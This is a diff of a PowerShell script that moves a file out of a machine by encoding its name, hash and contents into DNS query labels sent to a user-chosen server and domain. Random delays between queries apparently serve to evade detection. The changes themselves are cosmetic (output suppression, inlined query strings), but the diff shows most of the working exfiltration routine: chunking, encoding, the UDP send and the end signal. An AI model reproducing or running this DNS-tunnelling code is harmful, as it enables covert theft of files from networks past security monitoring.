@@ -91,7 +91,7 @@ function Send-DNSQuery {
         $udpClient = New-Object System.Net.Sockets.UdpClient
         $queryBytes = [System.Text.Encoding]::ASCII.GetBytes($data)
         
-        $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
+        $null = $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
         $udpClient.Close()
 
         # Add a random delay between 0.1 seconds and the user-provided maximum delay
@@ -121,7 +121,7 @@ function Send-FileInfo {
 
     $query = "f.$encodedFileName.$encodedFileMD5.$encodedChunkCount.$domain"
     Write-Host "Sending file info: $fileName, MD5: $fileMD5, Total Chunks: $totalChunks"
-    Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
+    $null = Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
 }
 
 # Function to send file in chunks with randomized query sending
@@ -145,8 +145,7 @@ function Send-FileChunks {
         # Display the current chunk number and total chunk count
         Write-Host "Sending chunk $chunkNumber of $totalChunks"
 
-        $query = "c$chunkNumber.$encodedChunkData.$domain"
-        Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
+        $null = Send-DNSQuery -data "c$chunkNumber.$encodedChunkData.$domain" -server $server -maxDelay $maxDelay
 
         $chunkNumber++
     }
@@ -165,9 +164,8 @@ function Send-EndSignal {
         [double]$maxDelay
     )
 
-    $query = "e.end.$domain"
+    $null = Send-DNSQuery -data "e.end.$domain" -server $server -maxDelay $maxDelay
     Write-Host "Sending end of transmission signal"
-    Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
 }
 
 # Main function to send the file
@@ -186,19 +184,19 @@ function Send-File {
     $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)
 
     # First send file info (filename, MD5 hash, and chunk count)
-    Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -totalChunks $totalChunks -server $server -domain $domain -maxDelay $maxDelay
+    $null = Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -totalChunks $totalChunks -server $server -domain $domain -maxDelay $maxDelay
 
     # Now send file chunks
-    Send-FileChunks -filePath $filePath -server $server -domain $domain -maxDelay $maxDelay -totalChunks $totalChunks
+    $null = Send-FileChunks -filePath $filePath -server $server -domain $domain -maxDelay $maxDelay -totalChunks $totalChunks
 
     # Signal the end of transmission
-    Send-EndSignal -server $server -domain $domain -maxDelay $maxDelay
+    $null = Send-EndSignal -server $server -domain $domain -maxDelay $maxDelay
 
     # Print success message after entire file is sent and transmission ends
     Write-Host "File transmission complete!"
 }
 
-# Example usage of the main function
+# Usage of the main function
 $filePath = Read-Host "Enter the file path to send"
 $server = Read-Host "Enter the DNS name or IP address of the server"
 $maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries")
